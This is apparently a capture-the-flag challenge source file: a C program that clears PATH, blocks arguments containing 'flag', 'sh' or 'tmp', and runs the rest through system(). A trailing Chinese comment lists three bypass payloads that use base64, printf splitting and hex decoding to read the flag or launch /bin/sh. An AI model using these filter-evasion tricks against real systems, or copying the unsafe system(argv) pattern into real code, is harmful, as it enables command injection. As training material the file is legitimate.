#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "flag")!=0;
        r += strstr(cmd, "sh")!=0;
        r += strstr(cmd, "tmp")!=0;
        return r;
}
int main(int argc, char* argv[], char** envp){
        putenv("PATH=/thankyouverymuch");
        if(filter(argv[1])) return 0;
        system( argv[1] );
        return 0;
}

/*
绕过方法：
  ./cmd1 "echo L2Jpbi9jYXQgZmxhZwo= | \`/usr/bin/base64 -d\`"
  ./cmd1 '$(printf "/bin/cat %s%s" "fl" "ag")'
  ./cmd1 '$(/bin/echo 2f62696e2f7368 | /usr/bin/xxd -r -p)'
*/